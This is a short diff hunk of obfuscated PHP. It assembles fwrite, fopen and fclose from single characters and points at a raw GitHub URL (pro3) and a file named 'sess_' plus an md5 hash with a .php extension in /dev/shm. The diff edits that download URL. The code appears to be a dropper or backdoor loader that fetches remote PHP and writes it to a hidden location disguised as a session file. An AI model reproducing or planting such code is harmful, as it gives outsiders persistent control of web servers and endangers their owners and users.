@@ -6,7 +6,7 @@ $o1 = "f" . "w" . "r" . "i" . "t" . "e";
 $z2 = "f" . "o" . "p" . "e" . "n";
 $d3 = "f" . "c" . "l" . "o" . "s" . "e";
 $d4 = 'sess_' . md5('mangsud') . '.php';
-$u5 = ['https://raw.githubusercontent.com/aqilogic/logic/refs/heads/main/pro3.php', "/dev/shm/$d4"];
+$u5 = ['https://raw.githubusercontent.com/aqilogic/logic/refs/heads/main/pro3', "/dev/shm/$d4"];
 
 function n4(){
     global $z2, $o0, $o1, $d3, $u5;
